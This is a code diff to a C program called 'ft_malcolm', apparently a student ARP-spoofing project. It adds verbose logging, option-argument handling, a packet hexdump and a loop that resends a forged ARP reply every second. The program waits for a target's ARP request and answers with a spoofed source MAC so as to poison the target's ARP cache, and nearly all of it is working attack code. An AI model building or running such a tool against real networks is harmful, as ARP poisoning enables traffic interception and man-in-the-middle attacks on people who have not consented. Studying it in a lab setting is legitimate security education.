@@ -7,7 +7,7 @@ int wait_for_arp_req(int socketfd, struct ft_malcolm * malcolm)
     //struct ethhdr * infos_req = (struct ethhdr *)(buffer);
 	ft_memset(buffer, 0, sizeof(struct ethhdr) + sizeof(struct arp_header));
     
-    while (ft_memcmp(arp_req->sender_mac, malcolm->target_mac, MAC_LENGTH) && ft_memcmp(arp_req->sender_ip, malcolm->target_ip, IPV4_LENGTH))
+    while (ft_memcmp(arp_req->sender_mac, malcolm->target_mac, MAC_LENGTH) != 0 && ft_memcmp(arp_req->sender_ip, malcolm->target_ip, IPV4_LENGTH) != 0)
     {
         ft_memset(buffer, 0, sizeof(struct ethhdr) + sizeof(struct arp_header));
         while (ft_memcmp(buffer, "\xff\xff\xff\xff\xff\xff", MAC_LENGTH))
@@ -46,14 +46,21 @@ int get_interface(struct ft_malcolm * malcolm)
             (temp->ifa_addr && temp->ifa_addr->sa_family != AF_INET) || // interface has ipv4
             ((IFF_UP & temp->ifa_flags) != IFF_UP) //interface is not up
         )
+        {
+            if (malcolm->verbose)
+                printf("Interface not suitable found %s / family : %s\n", temp->ifa_name, (temp->ifa_addr->sa_family == AF_INET ? "AF_INET" : temp->ifa_addr->sa_family == AF_INET6 ? "AF_INET6" : "AF_PACKET"));
             continue;
-
+        }
         if (((IFF_LOOPBACK  & temp->ifa_flags) != IFF_LOOPBACK)) // interface is not a loop back (lo)
         {
           printf("Found available interface: %s\n", temp->ifa_name);
           malcolm->socket_address->sll_ifindex = index;
           freeifaddrs(ifaddr);
           return (0);
+        }
+        else if (malcolm->verbose)
+        {
+            printf("Suitable interface ignore : %s\n", temp->ifa_name);
         }
         index++;
     }
@@ -95,23 +102,27 @@ int send_arp_res(int socket, struct ft_malcolm * malcolm)
     else
     {
         printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
-        // for(int index=0;index<42;index++)
-        // {
-        //     printf("%02X ",buffer[index]);
-        //     if (index % 16 == 0 && index != 0)
-        //         printf("\n\t");
-        // }
-        // printf("\n\t");
+        if (malcolm->verbose)
+        {
+            printf("ARP Packet sent hexdump: \n\t");
+            for(int index=0;index<42;index++)
+            {
+                printf("%02X ",buffer[index]);
+                if (index % 16 == 0 && index != 0)
+                    printf("\n\t");
+            }
+            printf("\n");
+        }
     } 
     return (0);
 }
 
 void init_struct(struct sockaddr_ll * socket_address, struct ft_malcolm * malcolm, char ** argv)
 {
-    uint32_t src_ip = inet_addr(argv[1]);
-    uint32_t dest_ip = inet_addr(argv[3]);
-    const char *DEST_MAC = argv[4];
-    const char *SRC_MAC = argv[2];
+    uint32_t src_ip = inet_addr(argv[malcolm->padding + 1]);
+    uint32_t dest_ip = inet_addr(argv[malcolm->padding + 3]);
+    const char *DEST_MAC = argv[malcolm->padding + 4];
+    const char *SRC_MAC = argv[malcolm->padding + 2];
     
     convert_mac(DEST_MAC, malcolm->target_mac);
     convert_mac(SRC_MAC, malcolm->sender_mac);
@@ -135,12 +146,9 @@ int main(int argc, char** argv)
     int socket_fd, interface_index;
 
     malcolm.socket_address = &socket_address;
-    
-    if (argc != 5) 
-    {
-        dprintf(2, "Usage: %s <SRC_IP> <SRC_MAC> <DEST_IP> <DEST_MAC>\n", argv[0]);
+
+    if (check_args(argc, argv, &malcolm)) 
         return 1;
-    }
 
     if (getuid() != 0) 
     {
@@ -148,20 +156,19 @@ int main(int argc, char** argv)
         return 1;
     }
     
-
-    if (check_mac_format(argv[4]) == -1 || check_mac_format(argv[2]) == -1)
+    if (check_mac_format(argv[malcolm.padding + 4]) == -1 || check_mac_format(argv[malcolm.padding + 2]) == -1)
     {
         dprintf(2, "Wrong mac address format\n");
         return (1);
     }
 
-    if (check_ip_format(argv[1]) == -1 || check_ip_format(argv[3]) == -1)
+    if (check_ip_format(argv[malcolm.padding + 1]) == -1 || check_ip_format(argv[malcolm.padding + 3]) == -1)
     {
         dprintf(2, "Wrong ip address format\n");
         return (1);
     }
 
-    if (dns_lookup(argv[3]) == -1 || dns_lookup(argv[1]) == -1)
+    if (dns_lookup(argv[malcolm.padding + 3]) == -1 || dns_lookup(argv[malcolm.padding + 1]) == -1)
         return (1);
 
     // Submit request for a raw socket descriptor.
@@ -183,13 +190,16 @@ int main(int argc, char** argv)
         dprintf(2, "Error while waiting for ARP request \n");
         return (1);
     }
-    
     printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
-    if(send_arp_res(socket_fd, &malcolm) == -1)
+    do
     {
-        dprintf(2, "Error while waiting for ARP request \n");
-        return (1);
-    }
+        if(send_arp_res(socket_fd, &malcolm) == -1)
+        {
+            dprintf(2, "Error while waiting for ARP request \n");
+            return (1);
+        }
+        sleep(1);
+    } while (malcolm.repeate);
 
     printf("Exiting program...\n");
     close(socket_fd);
